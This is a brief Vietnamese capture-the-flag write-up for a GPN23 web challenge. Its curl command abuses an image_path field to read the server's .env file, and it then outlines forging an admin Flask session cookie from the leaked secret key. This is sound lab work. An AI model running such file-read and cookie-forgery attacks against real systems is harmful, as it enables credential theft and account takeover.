# 1

Đọc file `.env` trong cái tag img bị ẩn

```
curl -i -b "session=.eJyrViotTi1SsqpWKsrPSVWygnB1wFReYi5IxCAlsdIhrSg1JaVSqbYWAJ4PENs.aFbuog.c7wi8BxJx-IPSE0QuPGWArMJcmc" -X POST https://silvercourt-of-ai-enhanced-wealth.gpn23.ctf.kitctf.de/note/new \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'title=read_env' \
  --data-urlencode 'content=x' \
  --data-urlencode 'image_path=.env'
```



# 2

Dùng cái flask secret key leak được từ file .env -> tạo cookie đểu giả làm admin -> vào /moderator -> xem juicy note

